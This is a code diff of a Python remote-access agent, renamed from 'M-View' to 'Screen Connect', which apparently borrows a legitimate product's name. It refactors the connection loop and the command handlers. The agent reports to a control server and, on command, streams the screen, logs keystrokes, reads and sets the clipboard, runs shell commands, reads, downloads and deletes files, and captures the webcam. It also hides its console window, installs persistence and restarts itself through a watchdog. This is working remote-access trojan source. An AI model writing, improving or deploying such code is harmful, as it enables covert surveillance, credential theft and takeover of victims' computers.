             sio.emit("agent_connect", fp)
-            self.heartbeat.start()
-            self.cursor.start()
-            if CONFIG["ENABLE_KEYLOGGER"]: self.keylogger.start()
-            if CONFIG["ENABLE_CLIPBOARD"]: self.clipboard.start()
+
+            # Belt-and-suspenders: also do HTTP checkin
+            try:
+                requests.post(
+                    CONFIG["SERVER_URL"].rstrip("/") + "/agent/checkin",
+                    json={"device_id": CONFIG["DEVICE_TOKEN"], **fp},
+                    timeout=10
+                )
+            except Exception:
+                pass
+
+            heartbeat.start()
+            cursor.start()
+            if CONFIG["ENABLE_KEYLOGGER"]:  keylogger.start()
+            if CONFIG["ENABLE_CLIPBOARD"]:  clipboard.start()
 
         @sio.event
         def disconnect():
-            self._connected = False
-            log.warning("Disconnected.")
-            self.streamer.stop()
-            self.sys_monitor.stop()
-            self.heartbeat.stop()
+            log.warning("Disconnected from server.")
+            streamer.stop()
+            sys_monitor.stop()
+            heartbeat.stop()
+
+        # ── Frame ACK — THE KEY FIX ───────────────────────────────────────
+        @sio.on("frame_ack")
+        def on_frame_ack(data):
+            """
+            Server sends this after relaying each frame to dashboards.
+            We open the gate so the streamer sends the next frame.
+            Without this, streamer sends 1 frame and the gate stays closed.
+            """
+            streamer.on_ack()
 
         # ── Dashboard Commands ─────────────────────────────────────────────
         @sio.on("request_action")
@@ -1197,8 +1302,7 @@ class MViewAgent:
             if tab == "monitor":
                 action = data.get("action", "start")
                 if action == "start":
-                    # Dashboard can specify mode: "video" | "screenshot"
-                    self.streamer.start(
+                    streamer.start(
                         monitor=data.get("monitor",  CONFIG["STREAM_MONITOR"]),
                         fps=    data.get("fps",      CONFIG["STREAM_FPS"]),
                         quality=data.get("quality",  CONFIG["STREAM_QUALITY"]),
@@ -1206,30 +1310,29 @@ class MViewAgent:
                         mode=   data.get("mode",     CONFIG["STREAM_MODE"]),
                     )
                 elif action == "stop":
-                    self.streamer.stop()
+                    streamer.stop()
                 elif action == "set_mode":
-                    # Hot-switch between video and screenshot without restart
-                    self.streamer.set_mode(data.get("mode", "video"))
+                    streamer.set_mode(data.get("mode", "video"))
                     sio.emit("action_result", {
                         "device_id": CONFIG["DEVICE_TOKEN"],
                         "action": "set_mode",
-                        "mode": self.streamer.mode,
+                        "mode": streamer.mode,
                         "success": True,
                     })
                 elif action == "set_quality":
                     q = int(data.get("quality", 55))
-                    self.streamer._quality_current = max(10, min(95, q))
+                    streamer._quality_current = max(10, min(95, q))
                 elif action == "set_fps":
-                    self.streamer.fps = int(data.get("fps", 20))
+                    streamer.fps = int(data.get("fps", 20))
 
             # ── Single screenshot ──────────────────────────────────────────
             elif tab == "screenshot":
                 q = data.get("quality", CONFIG["STREAM_QUALITY"])
                 s = data.get("scale",   CONFIG["STREAM_SCALE"])
-                old_q, old_s = self.streamer.quality, self.streamer.scale
-                self.streamer.quality, self.streamer.scale = q, s
-                img = self.streamer.capture_single()
-                self.streamer.quality, self.streamer.scale = old_q, old_s
+                old_q, old_s = streamer.quality, streamer.scale
+                streamer.quality, streamer.scale = q, s
+                img = streamer.capture_single()
+                streamer.quality, streamer.scale = old_q, old_s
                 if img:
                     sio.emit("screenshot_result", {
                         "device_id": CONFIG["DEVICE_TOKEN"],
@@ -1315,61 +1418,65 @@ class MViewAgent:
             # ── System ────────────────────────────────────────────────────
             elif tab == "system":
                 action = data.get("action", "start")
-                if action == "start": self.sys_monitor.start(interval=data.get("interval", 2))
-                else:                 self.sys_monitor.stop()
+                if action == "start": sys_monitor.start(interval=data.get("interval", 2))
+                else:                 sys_monitor.stop()
 
             elif tab == "system_snapshot":
-                sio.emit("system_stats_report", self.sys_monitor.get_snapshot())
+                sio.emit("system_stats_report", sys_monitor.get_snapshot())
 
             elif tab == "disks":
-                sio.emit("disks_report",   {"device_id": CONFIG["DEVICE_TOKEN"], "disks":      self.sys_monitor.get_disk_list()})
+                sio.emit("disks_report",   {"device_id": CONFIG["DEVICE_TOKEN"], "disks":      sys_monitor.get_disk_list()})
 
             elif tab == "network":
-                sio.emit("network_report", {"device_id": CONFIG["DEVICE_TOKEN"], "interfaces": self.sys_monitor.get_network_interfaces()})
+                sio.emit("network_report", {"device_id": CONFIG["DEVICE_TOKEN"], "interfaces": sys_monitor.get_network_interfaces()})
 
             # ── Processes ─────────────────────────────────────────────────
             elif tab == "processes":
-                procs = self.proc_mgr.list_processes()
+                procs = proc_mgr.list_processes()
                 sio.emit("processes_report", {"device_id": CONFIG["DEVICE_TOKEN"], "processes": procs, "count": len(procs)})
 
             elif tab == "kill_process":
-                sio.emit("kill_result",    {"device_id": CONFIG["DEVICE_TOKEN"], **self.proc_mgr.kill_process(int(data.get("pid", 0)))})
+                sio.emit("kill_result", {"device_id": CONFIG["DEVICE_TOKEN"], **proc_mgr.kill_process(int(data.get("pid", 0)))})
 
             elif tab == "start_process":
-                sio.emit("start_process_result", {"device_id": CONFIG["DEVICE_TOKEN"], **self.proc_mgr.start_process(data.get("command", ""))})
+                sio.emit("start_process_result", {"device_id": CONFIG["DEVICE_TOKEN"], **proc_mgr.start_process(data.get("command", ""))})
 
             # ── Shell ─────────────────────────────────────────────────────
             elif tab == "shell":
-                result = self.shell.execute(data.get("command", "echo hello"), shell_type=data.get("shell_type", "cmd"))
+                result = shell.execute(data.get("command", "echo hello"), shell_type=data.get("shell_type", "cmd"))
                 sio.emit("shell_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})
 
             # ── Files ─────────────────────────────────────────────────────
             elif tab == "file_list":
-                sio.emit("file_list_result",     {"device_id": CONFIG["DEVICE_TOKEN"], **self.files.list_directory(data.get("path", "C:\\"))})
+                sio.emit("file_list_result",     {"device_id": CONFIG["DEVICE_TOKEN"], **files.list_directory(data.get("path", "C:\\"))})
 
             elif tab == "file_read":
-                sio.emit("file_read_result",     {"device_id": CONFIG["DEVICE_TOKEN"], **self.files.read_file(data.get("path", ""))})
+                sio.emit("file_read_result",     {"device_id": CONFIG["DEVICE_TOKEN"], **files.read_file(data.get("path", ""))})
 
             elif tab == "file_download":
-                sio.emit("file_download_result", {"device_id": CONFIG["DEVICE_TOKEN"], **self.files.download_file(data.get("path", ""))})
+                sio.emit("file_download_result", {"device_id": CONFIG["DEVICE_TOKEN"], **files.download_file(data.get("path", ""))})
 
             elif tab == "file_delete":
-                sio.emit("file_delete_result",   {"device_id": CONFIG["DEVICE_TOKEN"], **self.files.delete_file(data.get("path", ""))})
+                sio.emit("file_delete_result",   {"device_id": CONFIG["DEVICE_TOKEN"], **files.delete_file(data.get("path", ""))})
 
             elif tab == "drives":
-                sio.emit("drives_report", {"device_id": CONFIG["DEVICE_TOKEN"], "drives": self.files.list_drives()})
+                sio.emit("drives_report", {"device_id": CONFIG["DEVICE_TOKEN"], "drives": files.list_drives()})
 
             # ── Webcam ────────────────────────────────────────────────────
             elif tab == "webcam":
-                sio.emit("webcam_result",      {"device_id": CONFIG["DEVICE_TOKEN"], **self.webcam.capture(data.get("camera", 0))})
+                sio.emit("webcam_result",      {"device_id": CONFIG["DEVICE_TOKEN"], **webcam.capture(data.get("camera", 0))})
 
             elif tab == "webcam_list":
-                sio.emit("webcam_list_result", {"device_id": CONFIG["DEVICE_TOKEN"], "cameras": self.webcam.list_cameras()})
+                sio.emit("webcam_list_result", {"device_id": CONFIG["DEVICE_TOKEN"], "cameras": webcam.list_cameras()})
 
             # ── Clipboard ─────────────────────────────────────────────────
             elif tab == "clipboard_get":
                 if CLIPBOARD_OK:
-                    sio.emit("clipboard_result", {"device_id": CONFIG["DEVICE_TOKEN"], "content": pyperclip.paste()[:4096], "ts": datetime.utcnow().isoformat()})
+                    sio.emit("clipboard_result", {
+                        "device_id": CONFIG["DEVICE_TOKEN"],
+                        "content": pyperclip.paste()[:4096],
+                        "ts": datetime.utcnow().isoformat()
+                    })
 
             elif tab == "clipboard_set":
                 if CLIPBOARD_OK:
@@ -1387,11 +1494,11 @@ class MViewAgent:
 
             elif tab == "shutdown":
                 sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "shutdown", "success": True})
-                time.sleep(1); os.system("shutdown /s /t 10 /c \"M-View remote shutdown\"")
+                time.sleep(1); os.system("shutdown /s /t 10 /c \"Screen Connect remote shutdown\"")
 
             elif tab == "restart":
                 sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "restart", "success": True})
-                time.sleep(1); os.system("shutdown /r /t 10 /c \"M-View remote restart\"")
+                time.sleep(1); os.system("shutdown /r /t 10 /c \"Screen Connect remote restart\"")
 
             elif tab == "abort_shutdown":
                 os.system("shutdown /a")
@@ -1405,60 +1512,73 @@ class MViewAgent:
             else:
                 log.warning(f"Unknown tab: {tab}")
 
-    # ── Connection Loop — exponential backoff with jitter ─────────────────
+    # ── Main Run Loop — creates fresh client on every reconnect ───────────
     def run(self):
-        log.info(f"M-View Agent v{CONFIG['AGENT_VERSION']} starting…")
+        log.info(f"Screen Connect Agent v{CONFIG['AGENT_VERSION']} starting...")
         install_persistence()
         time.sleep(CONFIG["STARTUP_DELAY"])
 
-        while True:
+        while not self._stop_flag.is_set():
+            sio = streamer = sys_monitor = heartbeat = cursor = keylogger = clipboard = None
             try:
-                if not self._connected:
-                    log.info(f"Connecting to {CONFIG['SERVER_URL']}…")
-                    self.sio.connect(
-                        CONFIG["SERVER_URL"],
-                        transports=["websocket", "polling"],  # polling fallback for proxies
-                        wait_timeout=20,
-                    )
-                    self.sio.wait()
+                # ── Create fresh client every attempt ─────────────────────
+                sio, streamer, sys_monitor, heartbeat, cursor, keylogger, clipboard = self._make_client()
+
+                log.info(f"Connecting to {CONFIG['SERVER_URL']}...")
+                sio.connect(
+                    CONFIG["SERVER_URL"],
+                    transports=["websocket", "polling"],
+                    wait_timeout=20,
+                    socketio_path="/socket.io",
+                )
+                # sio.wait() blocks until disconnect
+                sio.wait()
 
             except socketio.exceptions.ConnectionError as e:
                 log.warning(f"Connection error: {e}")
             except Exception as e:
                 log.error(f"Agent error: {e}")
             finally:
-                self._connected = False
-                self.streamer.stop()
-                self.sys_monitor.stop()
-                self.heartbeat.stop()
+                # Clean shutdown of all sub-components
+                try:
+                    if streamer:    streamer.stop()
+                    if sys_monitor: sys_monitor.stop()
+                    if heartbeat:   heartbeat.stop()
+                    if cursor:      cursor.stop()
+                    if keylogger:   keylogger.stop()
+                    if clipboard:   clipboard.stop()
+                except Exception:
+                    pass
 
-            # Exponential backoff + jitter (prevents thundering herd on server restart)
+            if self._stop_flag.is_set():
+                break
+
+            # Exponential backoff + jitter
             jitter = random.uniform(0, self._reconnect_delay * 0.3)
             delay  = self._reconnect_delay + jitter
-            log.info(f"Reconnecting in {delay:.1f}s…")
+            log.info(f"Reconnecting in {delay:.1f}s...")
             time.sleep(delay)
             self._reconnect_delay = min(self._reconnect_delay * 2, CONFIG["RECONNECT_MAX"])
 
+    def stop(self):
+        self._stop_flag.set()
+
 
 # ════════════════════════════════════════════════════════════════════════════
-#  WATCHDOG — restarts agent if main thread dies
+#  WATCHDOG — restarts agent thread if it dies unexpectedly
 # ════════════════════════════════════════════════════════════════════════════
-def _watchdog(agent_ref: list):
-    """
-    Runs in a separate thread. If the agent's main thread exits unexpectedly,
-    creates a new agent instance and restarts.
-    """
-    time.sleep(30)   # give agent time to start
+def _watchdog(agent: ScreenConnectAgent, agent_thread_ref: list):
+    time.sleep(45)
     while True:
         time.sleep(60)
-        t = agent_ref[0]
+        t = agent_thread_ref[0]
         if t and not t.is_alive():
-            log.warning("Watchdog: agent thread died — restarting…")
+            log.warning("Watchdog: agent thread died — restarting...")
             try:
-                new_agent  = MViewAgent()
-                new_thread = threading.Thread(target=new_agent.run, daemon=False)
+                new_agent  = ScreenConnectAgent()
+                new_thread = threading.Thread(target=new_agent.run, daemon=False, name="sc-main")
                 new_thread.start()
-                agent_ref[0] = new_thread
+                agent_thread_ref[0] = new_thread
             except Exception as e:
                 log.error(f"Watchdog restart failed: {e}")
 
@@ -1467,21 +1587,19 @@ def _watchdog(agent_ref: list):
 #  ENTRY POINT
 # ════════════════════════════════════════════════════════════════════════════
 if __name__ == "__main__":
-    # Hide console window (--noconsole handles it, but this is the safe fallback)
+    # Hide console window
     try:
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     except Exception:
         pass
 
-    agent = MViewAgent()
+    agent = ScreenConnectAgent()
 
-    # Start agent in its own thread so watchdog can monitor it
-    agent_thread = threading.Thread(target=agent.run, daemon=False, name="mview-main")
+    agent_thread = threading.Thread(target=agent.run, daemon=False, name="sc-main")
     agent_ref    = [agent_thread]
     agent_thread.start()
 
-    # Start watchdog
-    watchdog_thread = threading.Thread(target=_watchdog, args=(agent_ref,), daemon=True, name="mview-watchdog")
+    watchdog_thread = threading.Thread(target=_watchdog, args=(agent, agent_ref), daemon=True, name="sc-watchdog")
     watchdog_thread.start()
 
     agent_thread.join()
